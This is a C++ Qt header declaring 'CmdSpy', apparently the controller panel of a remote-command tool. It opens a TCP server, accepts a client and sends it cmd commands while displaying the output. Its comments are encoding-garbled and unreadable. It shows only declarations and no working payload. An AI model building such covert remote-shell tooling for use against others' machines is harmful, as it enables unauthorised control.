#pragma once
#ifndef CMDSPY_H
#define CMDSPY_H

#include <QWidget>
#include <QApplication>
#include <QDesktopWidget>
#include <QTextEdit>
#include "tcpsocket.h"
#include "tcpserver.h"
#include <QLineEdit>
#include <QScrollBar>

class CmdSpy : public QWidget
{
    Q_OBJECT
public:
    explicit CmdSpy(QWidget* parent = 0);

    // �ͻ��˷��͵�����˵�ָ��
    const QByteArray CmdPWD = "PWD";    // ��ǰ�ļ�λ��

    // ��������
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // ��ʼCmd���Ʒ�������Ȼ�󷵻��µĶ˿ں�
    int startCmdSpyServer(QString userName);

private:
    TcpServer* mServer;     // �����
    TcpSocket* mSock;       // �ͻ�socket
    QTextEdit* mCmdRet;     // ��ʾ��
    QLineEdit* mCmdEdit;    // ����ͷ���cmdָ��
    QString _curRet;        // �������з���ֵ

    // ����ָ��
    void sendCommand(QString cmd);

    // �ѷ������ݼӵ�edit��
    void addRetValue(QString retValue);

signals:

public slots:
    // ���¿ͻ�����
    void newConnection(QTcpSocket* s);
    // ����������
    void processBuffer();

    // �����ı��仯
    void textChanged();
    // ����enter��ʹ�������cmdָ����Ҫ����
    void newCommand();

protected:
    // ��С����
    void resizeEvent(QResizeEvent*);

    // �ر�
    void closeEvent(QCloseEvent*);
};

#endif // CMDSPY_H
